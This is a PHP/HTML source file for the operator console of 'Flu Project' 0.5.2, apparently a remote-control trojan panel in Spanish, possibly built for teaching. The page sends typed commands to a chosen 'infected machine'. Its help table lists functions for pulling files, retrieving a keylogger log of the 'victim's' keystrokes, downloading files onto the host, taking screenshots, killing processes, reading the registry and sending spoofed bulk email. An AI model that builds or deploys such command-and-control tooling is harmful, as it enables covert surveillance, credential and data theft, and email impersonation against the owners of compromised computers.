<?php
header("Cache-Control: no-store, no-cache, must-revalidate");

//Comprobamos que existe una sesión y tiene la variable conectado, si no, redirige a la página principal
session_start();
if(empty($_SESSION['conectado']))
{
   header ("Location: index.php");
   exit;
}
error_reporting(0);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
	
		<script language="javascript"> 
			function iSubmitEnter(oEvento, oFormulario){ 
				var iAscii; 		 
				if (oEvento.keyCode) 
					iAscii = oEvento.keyCode; 
				else if (oEvento.which) 
					iAscii = oEvento.which; 
				else 
					return false; 
				if (iAscii == 13) 
					oFormulario.submit(); 
				return true; 
			} 
		</script>
		<script language="javascript" src="js/jquery-1.3.min.js"></script>
		<script language="JavaScript" type="text/javascript" src="js/ajax.js"></script>
		<script language="javascript">
		$(document).ready(function() {
			
			$().ajaxStart(function() {
				$('#loading').show();
				//$('#result').hide();
			}).ajaxStop(function() {
				$('#loading').hide();
				$('#result').fadeIn('slow');

			});
			$('#form, #fat, #fo3').submit(function() {
				
				$.ajax({
					type: 'POST',
					url: $(this).attr('action'),
					data: $(this).serialize(),
					success: function(data) {
						$('#result').html(data);
					}
				})
				var comando = document.getElementById("commands").value;
				comando = comando.replace(" ","");
				if(comando.substring(0,4)=="exit")
				{
					location.href="menuPrincipal.php";
				}

				document.getElementById("commands").value='';
				
				return false;
			}); 
		})  
		</script>
	</head>
	<body style="background-color:#000000; color: #FFFFFF" onLoad="setInterval('MostrarConsulta(\'consulta.php\')',2000);">
** La consola acepta los mismos comandos de un CMD o Powershell. Además, incluye los siguientes "comandos especiales":<br/>
<table>
<tr>
	<td width="35%">*&nbsp;getfile fichero&nbsp;&nbsp;&nbsp;</td><td width="65%"># Recupera un archivo de la máquina (máximo 3,5MB). Uso: getfile C:\imagenes de Flu\foto.jpg (sin comillas)<td/>
</tr>
<tr>
	<td width="35%">*&nbsp;getkeylogger&nbsp;&nbsp;&nbsp;</td><td width="65%"># Recupera el archivo del keylogger con las teclas pulsadas por la victima<td/>
</tr>
<tr>
	<td width="35%">*&nbsp;downloadfile url_fichero&nbsp;&nbsp;&nbsp;</td><td width="65%"># Descarga un archivo a la máquina infectada. Uso: downloadfile www.miweb.com/foto.bmp<td/>
</tr>
<tr>
	<td>*&nbsp;snapshot&nbsp;&nbsp;&nbsp;</td><td># Realiza una captura de pantalla de la máquina.<td/>
</tr>
<tr>
	<td>*&nbsp;wallpaper imagen&nbsp;&nbsp;&nbsp;</td><td># Modifica el fondo de pantalla de la máquina por la imágen que se le pase como argumento (url) <td/>
</tr>
<tr>
	<td>*&nbsp;powershell&nbsp;&nbsp;&nbsp;</td><td># Ejecuta comandos con powershell (si está instalada). Uso: powershell cat 'C:\imagenes de Flu\foto.jpg' (con comillas)<td/>
</tr>
<tr>
	<td>*&nbsp;getregisters&nbsp;&nbsp;&nbsp;</td><td># Recupera información del registro de Windows<td/>
</tr>
<tr>
	<td>*&nbsp;killprocess nombre_proceso&nbsp;&nbsp;&nbsp;</td><td># Mata el proceso indicado en el argumento<td/>
</tr>
<tr>
	<td>*&nbsp;playaudio fichero&nbsp;&nbsp;&nbsp;</td><td># Reproduce el archivo multimedia indicado en el argumento<td/>
</tr>
<tr>
	<td>*&nbsp;sendmail correo_origen | pass | servidor_correo | correo_suplantado | correo_destino | asunto | mensaje | numero_correos&nbsp;&nbsp;&nbsp;</td><td># Envía emails a una cuenta correo a través del servidor y cuenta de correo indicados<td/>
</tr>
<tr>
	<td>*&nbsp;exit&nbsp;&nbsp;&nbsp;</td><td># Cierra la consola y vuelve al menú principal<td/>
</tr>
</table>
<br/>Flu Project [Versi&oacute;n 0.5.2]
<br/>
Copyleft (c) 2012 Flu Project Corporation.
<br/><br/>
<?php
	function filtrar($variable)
	{
		return addcslashes(mysql_real_escape_string($variable),',<>');
	}

	$maquina = filtrar($_GET['maquina']);
	$_SESSION['maquina']=$maquina;
?>
	<div id="result"></div>
<?php
	echo '<form id="fo3" name="fo3" method="post" action="saveCommandsUnaMaquina.php?maquina='.$maquina.'">';
	echo '><input type="text" name="commands" id="commands" style="border: 0px; width: 95%; background-color: #000000; color: #FFFFFF" onkeypress="iSubmitEnter(event, document.form1)" >';
	echo '</form>';
?>
</body>
</html>
    